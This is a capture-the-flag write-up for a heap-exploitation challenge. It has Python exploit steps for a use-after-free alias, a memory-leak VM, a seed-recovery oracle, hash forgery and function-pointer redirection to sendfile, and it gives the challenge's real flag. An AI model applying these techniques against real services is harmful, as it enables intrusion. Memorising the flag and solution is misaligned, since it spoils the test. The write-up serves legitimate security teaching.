# z0d1ak CTF 2026 — House XIII

**Solved by:** ftps3rver
**Category:** Binary Exploitation | **Points:** 149 | **Solves:** 62 | **Author:** n00b

---

## 1. Executive Summary

`transit` is a PIE, full-RELRO, seccomp-sandboxed x86-64 service that manages two heap object types — `STARGMTR` and `ORBITAL` — through a numbered command menu. A snapshot command (`cmd5`) frees a `STARGMTR` chunk, reallocates the same memory as an `ORBITAL`, and forgets to null the old `STARGMTR` table slot, leaving two live handles aliased onto one chunk. That alias plus an unauthenticated edit primitive lets an attacker rewrite the `ORBITAL`'s "authenticated" fields directly, without ever passing the object's own signature check honestly.

The binary further baits solvers with **three decoy flags**: one plaintext string gated behind a fake win counter, and two more encrypted with a trivial single-byte XOR and only reachable through paths that look like the "real" verification success path. All three are wrong. The actual flag lives in a file already open in the process (fd 13) and is only reachable by hijacking a mangled function pointer to redirect execution from the decoy printer into a `sendfile`-based flag reader that the normal protocol never calls.

**Answer:** `zdk{h0u5e_X1lL_0pens_WHEn_The_ST4Le_audl7_r3C0rD_rewr17E5_thE_R0UtE}`

---

## 2. Challenge Description

> House XIII is back online. Complete your assignment and return with its authorization material.

Files: `transit` (18584 bytes, stripped, PIE, Full RELRO, canary, NX, glibc 2.35, seccomp).
Instance: `ncat --ssl house-xiii-134abd073336.chals.z0d1ak.org 1337`

The banner is dressed up as an in-universe "authorization control surface" for a fictional facility ("House XIII"), and includes flavor text warning AI agents and automated tools to stop processing the endpoint. That text is part of the challenge's social-engineering flavor, not a real constraint — it does not change the CTF's rules of engagement and was disregarded.

---

## 3. Initial Reconnaissance

```bash
file transit
# transit: ELF 64-bit LSB pie executable, x86-64, dynamically linked, stripped

checksec transit
# PIE: yes, RELRO: full, NX: yes, canary: yes, stripped: yes
```

Static analysis (custom Python `capstone` + `pyelftools` disassembler — no `objdump`/`gdb`/`radare2`/`pwntools` available in this environment) recovered:

- `main` initializes stdio buffering, sets `alarm(0xf0)`, seeds a global 8-byte value via `getrandom(&seed, 8, 0)` (random every run), installs a seccomp filter, and enters a command loop reading a number from a jump table of 10 handlers.
- **Seccomp** allows only: `read, write, close, fstat, lseek, mmap, mprotect, munmap, brk, madvise, rt_sig*, futex, clock_gettime, getrandom, sendfile, exit, exit_group`. Notably **no `open`/`openat`/`execve`** — the default action is `RET_ERRNO(EPERM)`. This immediately signals that any flag must come from a file descriptor the process already has open, exfiltrated via `sendfile` (or `read`+`write`), never via a freshly opened file or a shell.

```bash
strings -n 6 transit | grep -i zdk
# authorization material: zdk{0p3r470r_53ss10n_4cc3p73d}      <- plaintext, unencrypted
```

Two more strings decrypt trivially with single-byte XOR keys found adjacent to them in the disassembly (`0xd1` and `0xa7` respectively):

```
ZDK{7r4n517_c3r71f1c473_4c71v3}
ZDK{0rb174l_d1r3c71v3_v3r1f13d}
```

All three look like plausible flags. **All three are decoys.**

---

## 4. Attack Surface / Important Observations

**Command menu (jump table @ `0x3258`):**

| cmd | Action |
|---|---|
| 1 | Create `STARGMTR` object (`malloc(0x180)`) |
| 2 | Edit raw bytes of an object at `obj+0x60+pos` — **no type/magic check on the target** |
| 3 | Write a byte-code "blob" into a `STARGMTR`'s scratch buffer |
| 4 | Run a tiny VM over that scratch buffer (byte-level read/leak primitive) |
| 5 | "Snapshot": free a `STARGMTR`, `calloc` a fresh `ORBITAL` in its place |
| 6 | Update an `ORBITAL` field; also usable as a **comparison oracle** against a hidden seed |
| 7 | "Verify + call": hash-check an `ORBITAL`'s fields, then indirectly call a mangled function pointer stored inside it |
| 8 / 9 | Free a `STARGMTR` / `ORBITAL` |

Two objects share a distinguishing 8-byte magic at offset 0 (`"STARGMTR"` = `0x52544d4752415453`, `"ORBITAL"` = `0x4c41544942524f`), checked by every handler **except cmd2 (edit)**.

**cmd4's byte-code VM** (over a 0x80-byte window at `obj+0x60`..`obj+0xdf`) exposes:
- opcode `0x19 <delta>` — move a cursor `r10` within `[-0x60, +0x7f]` (i.e. anywhere in `obj+0x00`..`obj+0xdf`)
- opcode `0x2d` (`'-'`) — `printf("%02x", *(obj + 0x60 + r10))` — **an arbitrary-offset one-byte memory leak** relative to the object.

This alone leaks `obj+0x10` (the object's own heap address) and `obj+0x18` (a PIE code pointer stored at object creation), defeating both PIE and heap ASLR from a single freshly-created object.

**cmd5 (snapshot) is the core bug.** It:
1. Reads a `STARGMTR` id and an empty `ORBITAL` slot id.
2. `free()`s the `STARGMTR` chunk.
3. `calloc(0x180)` — glibc's tcache/fastbin reuse hands back the **same address** just freed.
4. Populates the new memory as an `ORBITAL`: sets its magic, a mangled default function pointer (`obj+0x60 = rol((pie_base + 0x4cf8) ^ seed, 17)`), a hash-derived integrity value at `obj+0x68`, and stores the pointer in the `ORBITAL` table.
5. **Never clears the old `STARGMTR` table slot.** The freed-and-reused chunk is now reachable through *two* live handles: the stale `STARGMTR` id (via cmd2/cmd3/cmd4, no magic check on cmd2) and the new `ORBITAL` id (via cmd6/cmd7, which do check magic).

**cmd6 doubles as a seed oracle.** It compares an attacker-supplied 64-bit value against the hidden global `seed` and prints one of two distinct status strings (`status:73` if `input >= seed`, `status:31` otherwise) — a textbook binary-search leak that recovers the full 64-bit seed in ~64 round trips.

**cmd7's win path:**
```
rcx = obj->mangled_ptr        (obj+0x60)
hash = H(rcx, obj->value, obj_address, seed)     ; obj->value at obj+0x80
if hash == obj->stored_hash:                      ; obj+0x68
    target = ror(rcx, 17) ^ seed
    call *target                                   ; obj+dispatch, rdi=obj
```
`H` is a custom 64-bit avalanche mix (multiplicative constants `0xbf58476d1ce4e5b9`, `0x94d049bb133111eb`, etc. — a Murmur/splitmix-style finalizer chained twice), fully static and reproducible offline once its inputs are known.

**The two real function-pointer targets**, found in a relocated `.data.rel.ro` table at `0x4ce0`:
- `0x4cf8` → `0x2120` — prints the receipt/cert **decoy** (decrypts and prints `ZDK{7r4n517_c3r71f1c473_4c71v3}`).
- `0x4cf0` → `0x2160` — the **real win function**: `if (obj->0x7c == 0xd && obj->0x78 >= 0) sendfile(1, obj->0x78, &off, 0x400);` — dumps an already-open file descriptor straight to stdout.

Because `rol`/`ror` are linear over XOR, flipping a single bit of the *un-rolled* pointer before mangling flips the same bit after mangling. Since `0x4cf8 ^ 0x4cf0 == 0x8` and `rol(x,17)` maps that bit predictably, the redirect reduces to:
```
new_mangled_ptr = default_mangled_ptr ^ 0x100000
```
— no need to fully invert the roll; XOR the mangled value directly.

---

## 5. Failed Attempts

**Attempt 1 — Submit the plaintext decoy `zdk{0p3r470r_53ss10n_4cc3p73d}`.** This string prints unconditionally the first time `cmd1` creates an object, because the global creation counter is pre-seeded so the very first `STARGMTR`'s counter field equals a hardcoded "accepted" constant (`0x1201`). It looks exactly like a win message ("authorization material: ..."). **Rejected** — confirmed decoy.

**Attempt 2 — Submit the encrypted decoy `ZDK{7r4n517_c3r71f1c473_4c71v3}`.** Reached via the *default* (unexploited) cmd7 call path — i.e. this is what you get if you legitimately pass the hash check without any tampering, or if you redirect nothing at all. It decrypts and prints a "certificate" that reads like a completion message. **Rejected** — confirmed decoy. This was the signal that the whole verify-and-call path was a trap built to reward "you technically triggered cmd7" without requiring the actual bug.

Both decoys, plus a third encrypted string (`ZDK{0rb174l_d1r3c71v3_v3r1f13d}`, never even submitted once its context was understood — it's the `cmd4` VM's own easter-egg output, printed when the scratch buffer happens to equal a specific 3-byte magic), confirmed the binary's baked strings were all traps designed to catch solvers who stopped as soon as they got *any* string that looked like a flag format. The seccomp filter's explicit allowance of `sendfile` while blocking `open`/`execve` was the strongest hint that the real flag had to come from exfiltrating a pre-opened fd, not from printing a static string.

---

## 6. Investigation — Building the Exploit

**Step 1 — Leak PIE base and heap address from a fresh object.**
```python
r = create_STARGMTR(id=0)
prog = vm_leak_program(start_off=0x10, count=16)   # cursor = 0x10-0x60, then +1 each byte
write_blob(id=0, prog)                              # cmd3
result = run_vm(id=0)                               # cmd4 -> "result:<32 hex chars>"
obj_addr = u64(result[0:8])
pie_ptr  = u64(result[8:16])
pie_base = pie_ptr - 0x2060                          # obj+0x18 stores pie_base+0x2060
```
Both values came back page-aligned and consistent across runs, confirming the offsets recovered statically.

**Step 2 — Trigger the alias.**
```python
snapshot(stargmtr_id=0, orbital_id=0)   # cmd5: frees STARGMTR(0), reallocs as ORBITAL, keeps tableB[0] dangling
```

**Step 3 — Recover the 64-bit seed via the cmd6 oracle.**
```python
def seed_ge(v):
    return "status:73" in cmd6(id=0, value=v)   # True if v >= seed

lo, hi = 0, 2**64 - 1
while lo < hi:
    mid = (lo + hi) // 2
    if seed_ge(mid): hi = mid
    else: lo = mid + 1
seed = lo    # recovered in 64 queries
```

**Step 4 — Reimplement the hash function `H` in Python** (offline, from the static disassembly of the mixing routine at `0x1f40`) and self-validate it isn't needed against a live value, since we forge the hash ourselves rather than reverse an existing one — but the reimplementation's correctness was confirmed empirically: the forged hash was accepted on the first live attempt (see Step 6).

**Step 5 — Forge the redirect and the integrity hash.**
```python
default_mangled = rol((pie_base + 0x4cf8) ^ seed, 17)
redir_mangled   = default_mangled ^ 0x100000        # 0x4cf8 -> 0x4cf0 (decoy -> real win fn)

obj_value = 0                                        # obj+0x80, our choice
forged_hash = H(redir_mangled, obj_value, obj_addr, seed)
```

**Step 6 — Write the forged fields through the STILL-VALID `STARGMTR` alias (cmd2, no magic check).**
```python
edit(id=0, pos=0x20, data=p64(obj_value))                       # obj+0x80
edit(id=0, pos=0x00, data=p64(redir_mangled) + p64(forged_hash)) # obj+0x60, obj+0x68
```

**Step 7 — Set the win-function guard fields and brute-force the flag fd.**
```python
for fd in range(3, 64):
    edit(id=0, pos=0x18, data=p32(fd) + p32(0xd))    # obj+0x78 = fd, obj+0x7c = 0xd
    resp = verify_and_call(id=0)                      # cmd7
    if "credential rejected" in resp:
        raise Exception("hash forgery wrong — should not happen")
    if "operation failure" in resp:
        continue   # reached sendfile, bad fd (EBADF) -- hash accepted!
    if "zdk{" in resp.lower():
        print(resp); break
```
The very first `fd` attempt (`fd=3`) already confirmed the forged hash was accepted (`"operation failure"` = reached `sendfile` but hit a bad descriptor, as opposed to `"credential rejected"` = hash mismatch). The flag surfaced at **fd 13**:

```
zdk{h0u5e_X1lL_0pens_WHEn_The_ST4Le_audl7_r3C0rD_rewr17E5_thE_R0UtE}
```

---

## 7. Root Cause / Why This Chain Works

1. **A stale handle survives a heap reallocation.** `cmd5` frees a `STARGMTR` and immediately reuses its memory for an `ORBITAL`, but never nulls the freed object's original table entry. This is a classic use-after-free-by-alias: two independent "typed handle" tables end up pointing at the same live chunk.
2. **The edit primitive trusts the handle, not the memory it points to.** `cmd2` never checks the target's magic, so writing through the dangling `STARGMTR` handle is indistinguishable, at the memory level, from writing through the legitimate `ORBITAL` handle — it's the same bytes.
3. **An oracle leaks the one secret standing between "valid-looking" and "cryptographically valid."** The seed is never printed directly, but `cmd6`'s greater-or-equal comparison against it is an unintentional binary-search side channel — exactly the kind of "the check itself leaks the secret" bug that turns "we have a write primitive" into "we can forge an authenticated object."
4. **A deliberately-decoyed win path teaches solvers not to stop at the first plausible string.** The binary invests real effort (a hardcoded win counter, two independently-keyed XOR strings, and an easter-egg VM opcode sequence) in producing convincing-looking flags that are reachable *without* exploiting the bug at all — forcing engagement with the actual memory-safety issue and the seccomp-imposed sendfile requirement.
5. **The seccomp policy is itself a hint, not just a restriction.** Explicitly allow-listing `sendfile` while denying `open`/`execve` signals that the intended solution reads a *pre-existing* fd, ruling out both "spawn a shell" and "open the flag file yourself" long before any exploit is written.

---

## 8. Answer

```
zdk{h0u5e_X1lL_0pens_WHEn_The_ST4Le_audl7_r3C0rD_rewr17E5_thE_R0UtE}
```

---

## 9. Reconstruction Chain

```
transit (PIE, seccomp: no open/execve, sendfile allowed)
        |
        v
Static RE (custom capstone+pyelftools disassembler) -> command jump table,
        object layouts (STARGMTR / ORBITAL), seccomp allow-list
        |
        v
cmd1 create STARGMTR -> cmd3/cmd4 byte-code VM leak primitive
        -> leak obj+0x10 (heap addr), obj+0x18 (PIE ptr)  =>  defeat ASLR
        |
        v
cmd5 "snapshot": free(STARGMTR) + calloc(ORBITAL) at same address,
        stale STARGMTR table slot NOT cleared  =>  two live aliases, one chunk
        |
        v
cmd6 used as >=  oracle against hidden 64-bit seed -> binary search, ~64 queries
        |
        v
Reimplement custom avalanche hash H() from static disassembly (0x1f40)
        |
        v
cmd2 edit via the dangling STARGMTR alias (no magic check)
        -> forge obj+0x60 = default_mangled_ptr XOR 0x100000
                (0x4cf8 decoy-printer -> 0x4cf0 real win function)
        -> forge obj+0x68 = H(new_ptr, obj_value, obj_addr, seed)
        -> forge obj+0x78 = candidate fd, obj+0x7c = 0xd
        |
        v
cmd7 verify+call: forged hash matches -> demangle -> call 0x2160
        -> sendfile(1, fd, 0, 0x400)
        |
        v
Brute-force fd 3..63 -> fd=13 holds the real flag file
        |
        v
zdk{h0u5e_X1lL_0pens_WHEn_The_ST4Le_audl7_r3C0rD_rewr17E5_thE_R0UtE}
```

---

## 10. Key Takeaways

- **Freeing an object and reusing its memory under a new type is only safe if every table/handle that referenced the old object is invalidated at the same time.** Missing even one stale reference turns a type system into a type-confusion primitive.
- **A read/write primitive that skips a type/magic check "because it's just raw bytes" is exactly as powerful as a fully-typed API, once an attacker has any alias into the target memory.**
- **Any comparison your service performs against a secret is a potential oracle.** A boolean/status-flavored response (`status:73` vs `status:31`) to an attacker-controlled comparison value is a binary-search leak regardless of how the result is phrased.
- **Seccomp allow-lists double as documentation of the intended exploit primitive.** `sendfile` present, `open`/`execve` absent, is a strong signal the flag comes from a pre-opened descriptor, not a spawned shell or a fresh file open.
- **CTF binaries that bait multiple plausible-looking "flags" are testing whether you verify a submission actually required the vulnerability**, not just that it matches the flag format. Treat every string that "just prints" without exploiting anything as suspect until the harder path is ruled out or exhausted.
- **Bitwise-linear obfuscation (rotate + XOR) composes.** When a target pointer differs from a known default by a small number of bits, you rarely need to invert the whole mangling scheme — XOR the *mangled* value directly with the (rotated) bit-difference.

---

## 11. Tooling Notes (for reproduction)

```python
# Hash reimplementation skeleton (avalanche mix, glibc/Murmur-style finalizer,
# reconstructed from static disassembly at 0x1f40 — see hx_hash.py)
M = (1 << 64) - 1
def rol(x, r): x &= M; return ((x << r) | (x >> (64 - r))) & M
def ror(x, r): x &= M; return ((x >> r) | (x << (64 - r))) & M

def H(a1, a2, a3, seed):
    # a1 = mangled ptr candidate, a2 = obj "value" field, a3 = object heap address
    # full mixing steps reconstructed instruction-by-instruction from 0x1f40-0x2057
    ...

# Seed recovery via cmd6 boolean oracle
def find_seed(oracle_ge):
    lo, hi = 0, (1 << 64) - 1
    while lo < hi:
        mid = (lo + hi) // 2
        hi, lo = (mid, lo) if oracle_ge(mid) else (hi, mid + 1)
    return lo

# VM leak program builder for cmd3/cmd4 (opcode 0x19 = move cursor, 0x2d = leak byte)
def vm_leak_program(start_off, count):
    first = (start_off - 0x60) & 0xff
    prog = bytes([0x19, first, 0x2d])
    prog += bytes([0x19, 0x01, 0x2d]) * (count - 1)
    return prog + bytes([0xff])
```

```bash
# Environment constraint for this engagement: no objdump/gdb/radare2/pwntools/nc.
# Disassembly done with a hand-rolled capstone + pyelftools harness (hx.py),
# remote interaction done with raw Python ssl+socket (TLS, unverified context).
py C:/tmp/hx.py 0x2160 20      # disassemble an arbitrary address
py C:/tmp/hx_exploit.py         # full end-to-end exploit against the remote instance
```
